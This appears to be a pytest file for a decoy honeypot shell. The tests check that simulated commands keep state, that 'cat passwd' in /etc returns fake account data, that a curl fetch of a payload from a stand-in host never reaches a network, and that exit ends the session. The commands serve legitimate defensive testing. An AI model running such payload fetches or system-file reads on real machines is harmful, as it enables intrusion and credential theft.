from app.shell import DecoyShell


def test_shell_is_simulated_and_stateful():
    shell = DecoyShell("deploy")
    assert shell.execute("whoami") == ("deploy\n", False)
    assert shell.execute("cd /etc") == ("", False)
    assert shell.execute("pwd") == ("/etc\n", False)
    output, should_exit = shell.execute("cat passwd")
    assert "root:x:0:0" in output
    assert not should_exit


def test_downloads_never_reach_a_network():
    output, _ = DecoyShell("root").execute("curl https://example.invalid/payload")
    assert "Could not resolve host" in output


def test_exit_closes_session():
    assert DecoyShell("root").execute("exit")[1] is True
